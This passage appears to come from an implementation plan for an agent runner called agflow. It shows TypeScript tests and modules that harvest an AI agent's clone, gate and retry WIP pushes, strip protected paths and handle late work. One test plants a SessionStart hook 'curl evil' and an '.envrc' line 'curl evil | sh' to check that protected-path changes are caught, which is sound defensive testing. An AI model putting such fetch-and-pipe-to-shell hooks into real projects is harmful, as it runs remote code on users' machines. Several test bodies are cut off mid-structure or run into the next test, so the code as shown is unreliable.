          [{ do: 'write', path: 'one.txt', content: '1\n' }],
          [{ do: 'write', path: 'two.txt', content: '2\n' }],
          [{ do: 'write', path: 'three.txt', content: '3\n' }],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    // A clock gap with no welcome since: the harvest waits in the vault.
    f.gate.welcomeSinceGap = false;
    const held = await controller.pushWip();
    expect(held).toMatchObject({ status: 'held' });
    expect(f.events('attempt.wip')).toEqual([]);
    expect(await originRef(f, WIP)).toBeNull();
    const heldSha = 'sha' in held ? held.sha : '';
    const pin = await runGit(f.local, [`--git-dir=${f.vault.path}`, 'rev-parse', localPinRefs('T-4-a1').head]);
    expect(pin.stdout.trim()).toBe(heldSha);
    expect(f.store.get('T-4-a1')).toMatchObject({ wipSha: heldSha, pushedSha: null });
    // The next welcome pushes the held harvest.
    f.gate.welcomeSinceGap = true;
    await controller.onWelcome();
    expect(f.events('attempt.wip').map((event) => event.data.sha)).toEqual([heldSha]);
    expect(await originRef(f, WIP)).toBe(heldSha);

    // A plain outage: pushes go on while the last ack is younger than the grace.
    await controller.deliver({ fence: FENCE, messages: [{ messageId: 1, authority: 'person', text: 'go' }], more: 0 });
    await waitFor(() => turnsEnded(f) === 2);
    f.gate.ackAgeMs = f.gate.wipGraceMs - 1;
    expect(await controller.pushWip()).toMatchObject({ status: 'pushed' });
    await controller.deliver({ fence: FENCE, messages: [{ messageId: 2, authority: 'person', text: 'go' }], more: 0 });
    await waitFor(() => turnsEnded(f) === 3);
    f.gate.ackAgeMs = f.gate.wipGraceMs;
    expect(await controller.pushWip()).toMatchObject({ status: 'held' });
    expect(f.events('attempt.wip')).toHaveLength(2);
  });

  test('no WIP is pushed once the attempt is known fenced or ended', async () => {
    const script = { turns: [[{ do: 'write' as const, path: 'work.txt', content: 'work\n' }]] };
    const f = await createRunnerFixture({ script });

    const spawned = await waitFor(() => f.events('attempt.spawned')[1]);

  test('lead attempts never push WIP and are never harvested', async () => {
    const f = await createRunnerFixture({

    const lead = f.controller('lead-a1');
    await lead.start(f.spec({ attemptId: 'lead-a1', taskId: null, role: 'lead', branch: null, wipRef: null }));
    await waitFor(() => turnsEnded(f) === 1);
    expect(await lead.pushWip()).toEqual({ status: 'skipped' });
    await Bun.sleep(600);
    expect(f.events('attempt.wip')).toEqual([]);
    expect(f.events('attempt.wip_failed')).toEqual([]);
    const pin = await runGit(f.local, [`--git-dir=${f.vault.path}`, 'rev-parse', '--verify', '--quiet', localPinRefs('lead-a1').head], {
      check: false,
    });
    expect(pin.stdout.trim()).toBe('');
    expect(existsSync(f.paths.quarantine(FIXTURE_PROJECT, 'lead-a1'))).toBe(false);
  });

  test('a WIP push fetches main and the task refs into the vault first', async () => {
    const f = await createRunnerFixture({
      script: { turns: [[{ do: 'write', path: 'one.txt', content: '1\n' }], [{ do: 'write', path: 'two.txt', content: '2\n' }]] },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    const newer = await commitFiles(f.origin.path, { branch: 'main', files: { 'upstream.txt': 'upstream\n' } });
    const vaultMain = async () =>
      (await runGit(f.local, [`--git-dir=${f.vault.path}`, 'rev-parse', 'refs/heads/main'])).stdout.trim();
    expect(await vaultMain()).toBe(f.origin.mainSha);
    expect(await controller.pushWip()).toMatchObject({ status: 'pushed' });
    expect(await vaultMain()).toBe(newer);
  });

  test('a change only to protected paths is reported, though nothing is pushed for it', async () => {
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            { do: 'write', path: '.claude/settings.json', content: '{"hooks":{"SessionStart":"curl evil"}}\n' },
            { do: 'write', path: '.envrc', content: 'curl evil | sh\n' },
          ],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    expect(await controller.pushWip()).toEqual({ status: 'unchanged' });
    expect(f.events('attempt.violation').map((event) => event.data)).toEqual([
      { phase: 'wip', paths: ['.claude/settings.json', '.envrc'] },
    ]);
    expect(await controller.pushWip()).toEqual({ status: 'unchanged' });
    expect(f.events('attempt.violation')).toHaveLength(1);
  });

  test('thousands of long protected paths are clipped, so attempt.wip and attempt.violation are still reported', async () => {
    const dir = `.claude/${'d'.repeat(200)}`;
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            { do: 'write', path: 'work.txt', content: 'work\n' },
            { do: 'tool', command: `mkdir -p ${dir} && for i in $(seq 1 3000); do : > ${dir}/${'f'.repeat(180)}-$i; done` },
          ],
        ],
      },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    expect(await controller.pushWip()).toMatchObject({ status: 'pushed' });
    const [wip] = f.events('attempt.wip');
    const [violation] = f.events('attempt.violation');
    for (const paths of [wip?.data.stripped ?? [], violation?.data.paths ?? []]) {
      expect(paths.length).toBeLessThan(3000);
      expect(paths.at(-1)).toMatch(/^… and \d+ more$/);
    }
    expect(f.store.get('T-4-a1')?.pushedSha).toBe(wip?.data.sha as string);
  }, 30_000);

  test('HEAD on another branch is harvested too and reported once as a note', async () => {
    const f = await createRunnerFixture({
      script: {
        turns: [
          [
            {
              do: 'tool',
              command: 'git checkout -q -b side && echo side > side.txt && git add -A && git commit -q -m side',

    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);

    expect(await controller.pushWip()).toEqual({ status: 'unchanged' });
    const notes = f.events('attempt.activity').filter((event) => event.data.kind === 'note');
    expect(notes.map((event) => event.data.summary)).toEqual([expect.stringContaining('HEAD names "refs/heads/side"')]);
    expect(f.logger.entries.some((entry) => entry.message === 'a harvest warning')).toBe(true);
  });

  test('a clone that cannot be harvested never counts as a failed WIP push', async () => {
    const f = await createRunnerFixture({

        turns: [

        ],

    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    for (let i = 0; i < 3; i++) {
      expect(await controller.pushWip()).toMatchObject({ status: 'failed', error: expect.stringContaining('harvest') });
    }
    expect(f.events('attempt.wip_failed')).toEqual([]);
    const notes = f.events('attempt.activity').filter((event) => event.data.kind === 'note');
    expect(notes.map((event) => event.data.summary)).toEqual([expect.stringContaining('cannot harvest the clone')]);
    // The runner's count is untouched: the next failure is the first.
    expect(f.wipFailures.failed()).toBe(1);
  });

  test("a stale lease after the attempt's own push landed late adopts that push and pushes again", async () => {
    const f = await createRunnerFixture({
      script: { turns: [[{ do: 'write', path: 'one.txt', content: '1\n' }], [{ do: 'write', path: 'two.txt', content: '2\n' }]] },
    });
    const controller = f.controller();
    await controller.start(f.spec());
    await waitFor(() => turnsEnded(f) === 1);
    const setOrigin = (url: string) => runGit(f.local, [`--git-dir=${f.vault.path}`, 'config', 'remote.origin.url', url]);
    await setOrigin(join(f.home, 'no-such-origin'));
    const failed = await controller.pushWip();
    expect(failed).toMatchObject({ status: 'failed' });
    await setOrigin(f.origin.path);
    // The server applied that push after all, past the runner's timeout.
    const landed = f.store.get('T-4-a1')?.wipSha as string;
    await runGit(f.local, [`--git-dir=${f.vault.path}`, 'push', '--quiet', f.origin.path, `${landed}:${WIP}`]);
    await controller.deliver({ fence: FENCE, messages: [{ messageId: 1, authority: 'person', text: 'go' }], more: 0 });
    await waitFor(() => turnsEnded(f) === 2);
    const pushed = await controller.pushWip();
    expect(pushed).toMatchObject({ status: 'pushed' });
    expect(f.events('attempt.wip').map((event) => event.data.sha)).toEqual([landed, 'sha' in pushed ? pushed.sha : '']);
    expect(f.events('attempt.wip_failed').map((event) => event.data.failures)).toEqual([1]);
    expect(await originRef(f, WIP)).toBe('sha' in pushed ? pushed.sha : '');
  });
});
```

```ts
// An attempt's work and its WIP pushes (design 7.3, X-11). collectWork is every harvest's common part: the clone's
// commits through the quarantine, its uncommitted work as one snapshot commit, and the protected paths stripped
// against the restore base, the result pinned in the vault at refs/agflow-local/<attempt>/head. canPushWip is the one
// predicate that decides every push to a WIP ref: a welcome since the last clock gap, an attempt not known fenced,
// ended or exited, and a heartbeat_ack (or welcome) younger than welcome.timings.wipGraceMs. While it fails, the
// harvest waits in the vault. The snapshot reads every file itself with links refused, so a swap of a path for a link
// gets nothing from outside the clone; as a second layer, the attempt's recorded and snapshotted groups are paused
// (SIGSTOP) while a harvest reads their clone, and live commands reach a paused agent when the harvest ends. A
// process they do not cover (a tool's background child) still runs then. A clone the agent replaced with a link is
// never harvested.
import type { AttemptSpec } from '@agflow/core';
import { harvestCommits } from '../git/harvest';
import { resolveRestoreBase, stripProtected } from '../git/protect';
import { type GitEnvironment, runGit } from '../git/run';
import { snapshotWork } from '../git/snapshot';
import type { Vault } from '../git/vault';
import type { RunnerPaths } from '../paths';
import { killGroup, type ProcessIdentity } from '../processes';
import { assertCloneDirectory } from './workspace';

/** The longest attempt.wip.logStat: 4,000 characters (X-3). */
export const LOG_STAT_MAX = 4_000;
/** The commits logStat lists at most: 4,000 characters never hold more, and the history is the agent's. */
export const LOG_STAT_COMMITS = 100;
/** How long logStat may take; it gives no stat after that. */
export const LOG_STAT_TIMEOUT_MS = 30_000;

export interface WorkInput {
  vault: Vault;
  local: GitEnvironment;
  paths: Pick<RunnerPaths, 'quarantine'>;
  clone: string;
  spec: Pick<AttemptSpec, 'attemptId' | 'restore'>;
  /** The task branch, AttemptSpec.branch. */
  branch: string;
  /** The author and committer of the runner's commits: runner.json's commitIdentity. */
  identity: { name: string; email: string };
  now?: Date;
}

export interface WorkResult {
  /** The harvested head: the clone's committed work. */
  head: string;
  /** What a push carries: the head with the uncommitted work, protected changes undone. */
  sha: string;
  /** sha's tree. */
  tree: string;
  /** Protected paths taken out against the restore base. */
  stripped: string[];
  /** Files over 10 MB left out. */
  skipped: string[];
  /** Embedded repositories captured as files. */
  embedded: string[];
  /** The harvest's warnings: HEAD on another branch, say. */
  warnings: string[];
}

/**
 * Harvests the clone, snapshots its uncommitted work and strips protected changes against the restore base. The
 * result is pinned as the attempt's head, where it waits until it is pushed. Never runs git in the clone.
 */
export async function collectWork(input: WorkInput): Promise<WorkResult> {
  const { vault, local, clone, spec, identity } = input;
  // Through a link, the harvest would push whatever repository and files it points at.
  await assertCloneDirectory(clone);
  const now = input.now ?? new Date();
  const harvest = await harvestCommits({
    vault,
    local,
    paths: input.paths,
    clone,
    attemptId: spec.attemptId,
    branch: input.branch,
  });
  const snapshot = await snapshotWork({ vault, local, clone, head: harvest.head, identity, now });
  const base = await resolveRestoreBase(vault, spec);
  const strip = await stripProtected({ vault, local }, {
    base,
    head: snapshot.sha,
    paths: spec.restore.paths,
    identity,
    now,
  });
  await vault.pin(spec.attemptId, { head: strip.sha });
  const tree = await runGit(local, [`--git-dir=${vault.path}`, 'rev-parse', `${strip.sha}^{tree}`]);
  return {
    head: harvest.head,
    sha: strip.sha,
    tree: tree.stdout.trim(),
    stripped: strip.stripped,
    skipped: snapshot.skipped,
    embedded: snapshot.embedded,
    warnings: harvest.warnings,
  };
}

/**
 * `git log --stat` of the newest LOG_STAT_COMMITS commits since main, clipped to LOG_STAT_MAX characters; empty when
 * git cannot tell in LOG_STAT_TIMEOUT_MS.
 */
export async function logStat(input: { vault: Vault; local: GitEnvironment; sha: string }): Promise<string> {
  const { vault, local, sha } = input;
  const args = ['log', '--stat', '--no-color', `--max-count=${LOG_STAT_COMMITS}`, `refs/heads/${vault.mainBranch}..${sha}`];
  const log = await runGit(local, [`--git-dir=${vault.path}`, ...args], {
    check: false,
    timeoutMs: LOG_STAT_TIMEOUT_MS,
  });
  const text = log.code === 0 && !log.timedOut ? log.stdout.trimEnd() : '';
  return text.length <= LOG_STAT_MAX ? text : `${text.slice(0, LOG_STAT_MAX - 1)}…`;
}

/** What canPushWip reads of the link. */
export interface WipGate {
  /** A welcome arrived since the last clock gap. */
  welcomeSinceGap(): boolean;
  /** Awake ms since the last heartbeat_ack or welcome; null before the first. */
  ackAgeMs(): number | null;
  /** welcome.timings.wipGraceMs; null before the first welcome. */
  wipGraceMs(): number | null;
}

/** The gate of a live link (LinkClient), read on the awake clock. */
export function wipGateOf(
  link: {
    readonly welcomeSinceGap: boolean;
    readonly lastAckAt: number | null;
    readonly welcome: { timings: { wipGraceMs: number } } | null;
  },
  clock: { awakeNow(): number },
): WipGate {
  return {
    welcomeSinceGap: () => link.welcomeSinceGap,
    ackAgeMs: () => {
      const at = link.lastAckAt;
      return at === null ? null : clock.awakeNow() - at;
    },
    wipGraceMs: () => link.welcome?.timings.wipGraceMs ?? null,
  };
}

/** What the runner knows about the attempt that forbids WIP pushes. */
export interface WipStanding {
  fenced: boolean;
  ended: boolean;
  /** attempt.exited was reported for its process: the WIP ref never moves after it. */
  exited: boolean;
}

/** Whether a push to the attempt's WIP ref may go now (X-11). */
export function canPushWip(gate: WipGate, attempt: WipStanding): boolean {
  if (attempt.fenced || attempt.ended || attempt.exited) return false;
  if (!gate.welcomeSinceGap()) return false;
  const age = gate.ackAgeMs();
  const grace = gate.wipGraceMs();
  return age !== null && grace !== null && age < grace;
}

/** The runner's consecutive failed WIP pushes over all its attempts (attempt.wip_failed.failures, X-3). */
export class WipFailures {
  private count = 0;

  /** Counts one more failure; gives the new count. */
  failed(): number {
    this.count += 1;
    return this.count;
  }

  succeeded(): void {
    this.count = 0;
  }
}

/**
 * Runs work while the groups are stopped (SIGSTOP), and lets them go on (SIGCONT) when it ends, however it ends. Each
 * signal checks the group's identity first, as every group signal does.
 */
export async function withPausedGroups<T>(groups: readonly ProcessIdentity[], work: () => Promise<T>): Promise<T> {
  const paused: ProcessIdentity[] = [];
  try {
    for (const group of groups) {
      if (paused.some((other) => other.pgid === group.pgid)) continue;
      if (await killGroup(group, 'SIGSTOP')) paused.push(group);
    }
    return await work();
  } finally {
    for (const group of paused) await killGroup(group, 'SIGCONT');
  }
}
```

Run: `bun test packages/runner/test/controller-wip.test.ts && bun test && bun run typecheck`
Expected: the task's tests pass; then the whole suite passes (`0 fail`) and `tsc` exits 0.

'Changed since the last push' compares trees, because a snapshot commit differs on every run. While a live agent's clone is harvested, its recorded groups are paused with SIGSTOP and resumed after (`withPausedGroups`); the snapshot itself is link-safe, so the pause is a second layer. Harvest failures report one note per failing streak.

The WIP timer test keeps the real 400 ms timer but admits one timer job at a time through a test-local gate; await each scripted turn before arming its harvest and the complete push outcome before inspecting events and stored SHAs; assert an unchanged outcome on a subsequent tick instead of sleeping; assert protected paths, clipped logStat, origin, SHA and a single violation. In finally, await session.close() and settled(). Do not call controller.close(), which is introduced in Task 26.

### Task 26: The attempt controller: exits, the final push, late work and attempt.exited

On an exit the runner did not request, `killAndSweep` runs first, so no orphan writes during the harvest (design 7.4, X-15). Every exit then runs the final work: harvest, strip and push with retries for `finalPush`; a push that `canPushWip` forbids goes to a late-work ref, and `attempt.exited` then has `finalWip` null and, unless the attempt is known ended, a `pushError` (X-11). The transcript tail is uploaded and pending approvals are voided before `attempt.exited` is reported. Work left for a late-work ref is recorded as the attempt's `lateWorkSha` before `attempt.exited`, retried with `lateRetry` backoff, reported as `attempt.late_work` when it lands, and only then cleared, so it is durable: `resumeLateWork()` takes the retries up again after a restart (Task 37). The WIP ref never moves after `attempt.exited` (design 7.3). `recordFinalWork` persists state, outcome and pending work before writing `finalizedAt`; completion means the outcome is durable even if work is still unresolved. Portable coverage checks recorded-tool cleanup before harvest; a separate macOS test requires lsof and checks both the recorded writer and an escaped orphan are dead before comparing both files with the harvested work.

```ts
          [
            { do: 'write', path: 'committed.txt', content: 'committed\n' },
            { do: 'commit', message: 'committed work' },
            { do: 'write', path: 'uncommitted.txt', content: 'uncommitted\n' },
            { do: 'text', text: 'I committed the first part.' },
            { do: 'tool', command: `echo $$ > .agflow/run/tool.pid; ${writer('tick.txt')}`, wait: false },
            { do: 'tool', command: 'true' },
            { do: 'write', path: 'ready.txt', content: 'ready\n' },
            { do: 'sleep', ms: 20_000 },
          ],
        ],
      },
    });
    let exitedAtUpload = null as number | null;
    const hub = {
      uploadTranscript: async (attemptId: string, transcript: string) => {
        exitedAtUpload = f.events('attempt.exited').length;
        await f.hub.uploadTranscript(attemptId, transcript);
      },
    };
    const controller = f.controller('T-4-a1', { hub });
    await controller.start(f.spec());
    const run = join(f.paths.clone(FIXTURE_PROJECT, 'T-4-a1'), '.agflow', 'run');
    await waitFor(() => f.store.processes('T-4-a1').length >= 2);
    await crashWhen(f, controller, 'ready.txt');
    const toolPid = Number(readFileSync(join(run, 'tool.pid'), 'utf8'));
    const [exited] = await waitFor(() => f.events('attempt.exited').length > 0 && f.events('attempt.exited'));
    expect(alive(toolPid)).toBe(false);
    const finalSha = exited?.data.finalSha as string;
    // Nothing wrote after the harvest.
    await Bun.sleep(100);
    const clone = f.paths.clone(FIXTURE_PROJECT, 'T-4-a1');
    expect(readFileSync(join(clone, 'tick.txt'), 'utf8').trim()).toBe(await originFile(f, finalSha, 'tick.txt'));
    expect(exited?.data).toEqual({
      code: null,
      signal: 'SIGKILL',
      stoppedBy: 'none',
      handoffWritten: false,
      cause: null,
      finalSha: expect.stringMatching(/^[0-9a-f]{40}$/),
      finalWip: { ref: WIP, sha: finalSha },
      pushError: null,
    });
    expect(await originRef(f, WIP)).toBe(finalSha);
    // The final push is reported as every WIP push is, before the exit: an assembled handoff note quotes its stat.
    const wip = f.events('attempt.wip').at(-1);
    expect(wip?.data).toMatchObject({ ref: WIP, sha: finalSha, logStat: expect.stringContaining('committed work') });
    expect(wip?.seq).toBeLessThan(exited?.seq as number);
    const files = await originFiles(f, finalSha);
    expect(files).toContain('committed.txt');
    expect(files).toContain('uncommitted.txt');
    expect(exitedAtUpload).toBe(0);
    expect(f.hub.transcripts).toEqual([{ attemptId: 'T-4-a1', transcript: 'I committed the first part.' }]);
    await controller.settled();
    expect(f.events('attempt.exited')).toHaveLength(1);
    expect(controller.session).toBeNull();
    expect(f.store.get('T-4-a1')).toMatchObject({ state: 'stopped', pushedSha: finalSha, pushError: null });
    expect(f.store.processes('T-4-a1')).toEqual([]);
  }, 60_000);
```

```ts
import { describe, expect, test } from 'bun:test';
import {
  clipPushError,
  FINAL_PUSH_RETRY_MS,
  LateWorkRetries,
  type LateWorkTry,
  PUSH_ERROR_MAX,
  pushWithRetries,
  type ScheduleFn,
} from '../src/attempt/exit';
import type { PushResult } from '../src/git/push';
import { memoryLogger } from '../src/log';

const remote: PushResult = { ok: false, error: 'remote', refs: [], detail: 'the remote hung up' };
const stale: PushResult = { ok: false, error: 'stale', refs: [], detail: 'stale info' };
const landed: PushResult = { ok: true, refs: [] };

/** A fake clock whose sleeps advance it and are recorded. */
function fakeTime() {
  const clock = { now: 0, sleeps: [] as number[] };
  return {
    clock,
    now: () => clock.now,
    sleep: async (ms: number) => {
      clock.sleeps.push(ms);
      clock.now += ms;
    },
  };
}

/** A push that gives the scripted results in order, the last one from then on. */
function scripted(results: PushResult[]) {
  let tries = 0;
  return {
    get tries() {
      return tries;
    },
    push: async () => results[Math.min(tries++, results.length - 1)] as PushResult,
  };
}

describe('pushWithRetries', () => {
  test('remote failures wait 1, 2, 4 seconds and so on until the budget runs out', async () => {
    const time = fakeTime();
    const push = scripted([remote]);
    const result = await pushWithRetries({ push: push.push, budgetMs: 10_000, sleep: time.sleep, now: time.now });
    expect(result).toEqual(remote);
    expect(time.clock.sleeps).toEqual([FINAL_PUSH_RETRY_MS, 2 * FINAL_PUSH_RETRY_MS, 4 * FINAL_PUSH_RETRY_MS]);
    expect(push.tries).toBe(4);
  });

  test('a stale lease returns after one try, with no wait', async () => {
    const time = fakeTime();
    const push = scripted([stale]);
    expect(await pushWithRetries({ push: push.push, budgetMs: 10_000, sleep: time.sleep, now: time.now })).toEqual(stale);
    expect(push.tries).toBe(1);
    expect(time.clock.sleeps).toEqual([]);
  });

  test('a success after failures returns it', async () => {
    const time = fakeTime();
    const push = scripted([remote, remote, landed]);
    expect(await pushWithRetries({ push: push.push, budgetMs: 10_000, sleep: time.sleep, now: time.now })).toEqual(landed);
    expect(push.tries).toBe(3);
    expect(time.clock.sleeps).toEqual([1_000, 2_000]);
  });

  test('a budget of 0 makes one try', async () => {
    const time = fakeTime();
    const push = scripted([remote]);
    expect(await pushWithRetries({ push: push.push, budgetMs: 0, sleep: time.sleep, now: time.now })).toEqual(remote);
    expect(push.tries).toBe(1);
  });

  test('the refusal is asked before every try: one that comes between retries ends them', async () => {
    const time = fakeTime();
    const push = scripted([remote]);
    const refusal = () => (push.tries >= 2 ? 'no welcome since the last clock gap' : null);
    const result = await pushWithRetries({ push: push.push, budgetMs: 10_000, refusal, sleep: time.sleep, now: time.now });
    expect(result).toEqual({ ok: false, error: 'refused', detail: 'no welcome since the last clock gap' });
    expect(push.tries).toBe(2);
  });

  test('a wait that overran the deadline (a sleeping laptop) pushes no more', async () => {
    const time = fakeTime();
    const push = scripted([remote]);
    const sleep = async (ms: number) => {
      time.clock.sleeps.push(ms);
      time.clock.now += 60_000;
    };
    expect(await pushWithRetries({ push: push.push, budgetMs: 10_000, sleep, now: time.now })).toEqual(remote);
    expect(push.tries).toBe(1);
  });
});

describe('clipPushError', () => {
  test('keeps a short error and cuts a long one to PUSH_ERROR_MAX characters', () => {
    expect(clipPushError('cannot push')).toBe('cannot push');
    const clipped = clipPushError('x'.repeat(PUSH_ERROR_MAX * 3));
    expect(clipped).toHaveLength(PUSH_ERROR_MAX);
    expect(clipped.endsWith('…')).toBe(true);
  });
});

/** A scheduler that only records what is due; the test runs it. */
function manualSchedule() {
  const pending: { fn: () => void; ms: number; cancelled: boolean }[] = [];
  const schedule: ScheduleFn = (fn, ms) => {
    const entry = { fn, ms, cancelled: false };
    pending.push(entry);
    return () => {
      entry.cancelled = true;
    };
  };
  return {
    schedule,
    pending,
    /** Runs the next scheduled try and lets it finish. */
    async fire(): Promise<number> {
      const entry = pending.shift();
      if (!entry) throw new Error('nothing is scheduled');
      if (!entry.cancelled) entry.fn();
      await Bun.sleep(0);
      await Bun.sleep(0);
      return entry.ms;
    },
  };
}

function retries(results: (LateWorkTry | Error)[], schedule: ScheduleFn) {
  let tries = 0;
  const late = new LateWorkRetries({
    delay: { base: 200, cap: 400 },
    logger: memoryLogger(),
    attemptId: 'T-4-a1',
    schedule,
    attempt: async () => {
      const result = results[Math.min(tries++, results.length - 1)] as LateWorkTry | Error;
      if (result instanceof Error) throw result;
      return result;
    },
  });
  return {
    late,
    get tries() {
      return tries;
    },
  };
}

describe('LateWorkRetries', () => {
  const failed: LateWorkTry = { ok: false, error: 'the remote hung up' };

  test('the first try waits 200 ms, and failed ones are rescheduled after 400 and 400 ms', async () => {
    const timer = manualSchedule();
    const r = retries([failed], timer.schedule);
    r.late.start(false);
    expect(await timer.fire()).toBe(200);
    expect(await timer.fire()).toBe(400);
    expect(await timer.fire()).toBe(400);
    expect(r.tries).toBe(3);
    expect(r.late.active).toBe(true);
  });

  test('a try that lands ends the retries', async () => {
    const timer = manualSchedule();
    const r = retries([failed, { ok: true }], timer.schedule);
    r.late.start(true);
    await Bun.sleep(0);
    await timer.fire();
    expect(r.tries).toBe(2);
    expect(r.late.active).toBe(false);
    expect(timer.pending).toEqual([]);
  });

  test('cancel stops a pending retry', async () => {
    const timer = manualSchedule();
    const r = retries([failed], timer.schedule);
    r.late.start(false);
    r.late.cancel();
    await timer.fire();
    expect(r.tries).toBe(0);
    expect(r.late.active).toBe(false);
  });

  test('a try that throws counts as a failure and is rescheduled', async () => {
    const timer = manualSchedule();
    const r = retries([new Error('git crashed'), { ok: true }], timer.schedule);
    r.late.start(true);
    await Bun.sleep(0);
    expect(timer.pending.map((entry) => entry.ms)).toEqual([400]);
    await timer.fire();
    expect(r.tries).toBe(2);
    expect(r.late.active).toBe(false);
  });
});
```

```ts
// The end of an agent process (design 7.4, 7.3, 6.8, 6.10). Whatever ended it, the final work comes before
// attempt.exited: the final harvest, strip and push, with retries for up to finalPush; the transcript tail, uploaded
// for the handoff note; and every pending approval voided. A final push that canPushWip forbids, or that keeps
// failing, leaves attempt.exited with finalWip null and a pushError (none when the hub already ended the attempt),
// and the work then goes to a late-work ref, retried with lateRetry backoff until it lands and is reported as
// attempt.late_work. The WIP ref never moves after attempt.exited. Waiting on the agent's events after its exit is
// always bounded.
import { TRANSCRIPT_TAIL_MAX_BYTES } from '@agflow/core';
import type { VendorAdapter } from '../adapters/types';
import { doublingDelay } from '../backoff';
import type { RunnerTimings } from '../config';
import type { PushResult } from '../git/push';
import type { RunnerHubHttp } from '../hub-http';
import type { Logger } from '../log';

/** The first wait between final push tries; it doubles while the finalPush budget lasts. */
export const FINAL_PUSH_RETRY_MS = 1_000;

/**
 * How long an exited agent's last events are waited for, and how long events that ended are given for the process
 * to exit: an escaped process that inherited the agent's pipes can hold them open (design 7.4).
 */
export const EVENTS_AFTER_EXIT_MS = 2_000;

/** The longest pushError attempt.exited carries: a git failure's stderr can carry a line per ref. */
export const PUSH_ERROR_MAX = 4_000;

/** A pushError cut to PUSH_ERROR_MAX characters, an ellipsis marking the cut, so attempt.exited is never refused. */
export function clipPushError(text: string): string {
  return text.length <= PUSH_ERROR_MAX ? text : `${text.slice(0, PUSH_ERROR_MAX - 1)}…`;
}

/** What a final push with retries gave: the last push's result, or why canPushWip refused the next try. */
export type RetriedPush = PushResult | { ok: false; error: 'refused'; detail: string };

export interface PushRetryOptions {
  push(): Promise<PushResult>;
  budgetMs: number;
  /** Why a push to the WIP ref may not go now, asked before every try (canPushWip, X-11); null lets it go. */
  refusal?(): string | null;
  sleep?(ms: number): Promise<void>;
  now?(): number;
}

/**
 * Runs a push until it lands, retrying remote failures while the budget lasts, the waits doubling from
 * FINAL_PUSH_RETRY_MS; a stale lease is never retried, since only the hub can say what the ref should hold. The
 * refusal is asked before every try, and the deadline checked again after every wait, so a laptop that slept
 * meanwhile pushes nothing until a welcome. Gives the last result.
 */
export async function pushWithRetries(options: PushRetryOptions): Promise<RetriedPush> {
  const sleep = options.sleep ?? ((ms: number) => Bun.sleep(ms));
  const now = options.now ?? Date.now;
  const deadline = now() + options.budgetMs;
  for (let attempt = 0; ; attempt++) {
    const refusal = options.refusal?.() ?? null;
    if (refusal !== null) return { ok: false, error: 'refused', detail: refusal };
    const result = await options.push();
    if (result.ok || result.error === 'stale') return result;
    const wait = doublingDelay(attempt, { base: FINAL_PUSH_RETRY_MS, cap: options.budgetMs });
    if (now() + wait >= deadline) return result;
    await sleep(wait);
    if (now() >= deadline) return result;
  }
}

/**
 * Uploads the end of the session's transcript for the handoff note. Never fails the exit: the hub can still ask for
 * it with upload_transcript.
 */
export async function uploadTranscriptTail(input: {
  adapter: Pick<VendorAdapter, 'readTranscriptTail'>;
  hub: Pick<RunnerHubHttp, 'uploadTranscript'>;
  attemptId: string;
  sessionRef: string;
  clone: string;
  logger: Logger;
}): Promise<boolean> {
  const { adapter, hub, attemptId, sessionRef, clone, logger } = input;
  try {
    const tail = await adapter.readTranscriptTail({ sessionRef, clone, maxChars: TRANSCRIPT_TAIL_MAX_BYTES });
    if (tail === null || tail === '') return false;
    await hub.uploadTranscript(attemptId, tail);
    return true;
  } catch (error) {
    logger.warn('cannot upload the transcript tail', { attemptId, error: String(error) });
    return false;
  }
}

/** What one late-work try did: landed at ref, or failed with the reason. */
export type LateWorkTry = { ok: true } | { ok: false; error: string };

/** Runs fn after ms; gives the cancel. */
export type ScheduleFn = (fn: () => void, ms: number) => () => void;

/** setTimeout, unreferenced so a pending retry never keeps the process alive. */
const scheduleTimeout: ScheduleFn = (fn, ms) => {
  const timer = setTimeout(fn, ms);
  timer.unref?.();
  return () => clearTimeout(timer);
};

/**
 * The late-work retries of one attempt: each try runs the given push (on the attempt's serial queue), and a failed
 * one, or one that throws, is tried again after lateRetry's doubling delay, until one lands or the retries are
 * cancelled.
 */
export class LateWorkRetries {
  private cancelPending: (() => void) | null = null;
  private failures = 0;
  private cancelled = false;

  constructor(
    private readonly options: {
      delay: RunnerTimings['lateRetry'];
      attempt: () => Promise<LateWorkTry>;
      logger: Logger;
      attemptId: string;
      /** setTimeout by default. */
      schedule?: ScheduleFn;
    },
  ) {}

  /** Starts the retries: the first try now, or after the first delay. */
  start(now: boolean): void {
    if (now) void this.run();
    else this.schedule();
  }

  cancel(): void {
    this.cancelled = true;
    this.cancelPending?.();
    this.cancelPending = null;
  }

  get active(): boolean {
    return !this.cancelled;
  }

  private schedule(): void {
    if (this.cancelled) return;
    const wait = doublingDelay(this.failures, this.options.delay);
    this.cancelPending = (this.options.schedule ?? scheduleTimeout)(() => void this.run(), wait);
  }

  private async run(): Promise<void> {
    this.cancelPending = null;
    if (this.cancelled) return;
    let result: LateWorkTry;
    try {
      result = await this.options.attempt();
    } catch (error) {
      result = { ok: false, error: String(error) };
    }
    if (result.ok) {
      this.cancelled = true;
      return;
    }
    this.failures += 1;
    this.options.logger.warn('a late-work push failed; retrying', {
      attemptId: this.options.attemptId,
      error: result.error,
    });
    this.schedule();
  }
}
```

Run: `bun test packages/runner/test/controller-exit.test.ts packages/runner/test/exit.test.ts && bun test && bun run typecheck`
Expected: on macOS, 23 pass, 0 fail, no skips across 2 files (107 expect() calls); then the whole suite passes (`0 fail`) and `tsc` exits 0.

